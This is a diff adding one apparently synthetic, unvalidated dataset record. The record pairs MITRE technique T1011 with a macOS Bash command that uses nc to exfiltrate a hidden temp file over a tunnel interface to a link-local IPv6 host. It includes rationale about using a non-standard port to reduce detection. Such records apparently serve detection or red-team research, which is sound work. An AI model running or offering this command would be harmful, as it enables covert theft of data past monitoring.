@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr utun4)\" \"fe80::7:0bad:f00d%utun4\" 55222 < /private/var/tmp/.r",
+  "explanation": "Forces IPv6 TCP exfiltration over a secondary VPN/tunnel interface (utun4) to a link-local address on a high port, using an alternate medium per T1011.",
+  "rationale_steps": [
+    "Retrieve the utun4 IPv6 address with ipconfig to bind the source.",
+    "Send the data using TCP to a scoped link-local destination.",
+    "Use a non-standard port to reduce detection while keeping to the alternate medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-f93c25ff",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
